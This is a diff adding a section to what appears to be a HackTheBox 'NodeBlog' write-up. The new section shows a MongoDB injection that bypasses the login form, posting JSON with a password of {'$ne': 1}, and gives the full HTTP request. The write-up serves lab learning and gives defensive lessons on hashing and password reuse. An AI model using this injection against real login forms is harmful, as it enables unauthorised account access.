@@ -759,3 +759,37 @@ The next problem is the unserializing that led to the RCE. Unserialize should ne
 Finally, I was able to get root because I found the admin's password in the database. Passwords should never be stored in clear. They should always be hashed before they are stored anywhere.
 
 And more important, passwords should not be reused. The password used for connecting to the blog should not have given access to the user on the server.
+
+
+
+## Mongo Injection
+
+After I publihed this post, I started watching [IppSec's video of the box](https://www.youtube.com/watch?v=ahzOprfN--Y). At the beginning he mentioned that it's vulnerable to MongoDB injection. I completly missed that. So I launched back the box and tried to abuse it.
+
+I used Burp Repeater to play with the login form post. If you change the `Content-Type` header, you can post json to it. From there, I could change the password value to `"$ne": 1` to get a valid login.
+
+```http
+POST /login HTTP/1.1
+Host: target.htb:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+Content-Length: 25
+Origin: http://target.htb:5000
+Connection: close
+Referer: http://target.htb:5000/login
+Upgrade-Insecure-Requests: 1
+
+{
+"user": "admin",
+"password":{"$ne": 1}
+}
+```
+
+And I was connected on the blog.
+
+![Connected](/assets/images/2022/05/NodeBlog/BlogConnected.png "Connected")
+
+I wish I saw that while working on the box. It would have made the XXE easier to find. And the format of the `auth` cookie might have hinted the serialization issue. I need to get in the habbit of testing this.
